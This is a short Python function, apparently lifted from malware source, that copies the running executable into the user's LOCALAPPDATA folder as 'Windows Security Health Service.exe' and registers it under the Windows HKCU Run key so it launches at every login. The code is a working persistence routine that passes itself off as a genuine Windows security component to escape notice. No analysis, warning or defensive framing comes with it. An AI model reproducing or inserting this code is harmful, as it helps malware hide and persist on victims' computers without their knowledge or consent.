import os, sys, shutil, winreg

def autostart_reg():
    dst = os.path.join(os.environ["LOCALAPPDATA"], "Windows Security Health Service.exe")
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", access=winreg.KEY_ALL_ACCESS) as key:
        try:
            winreg.QueryValueEx(key, "Windows Security Health Service")
        except FileNotFoundError:
            shutil.copy2(sys.executable, dst)
            winreg.SetValueEx(key, "Windows Security Health Service", 0, winreg.REG_SZ, f'"{dst}"')
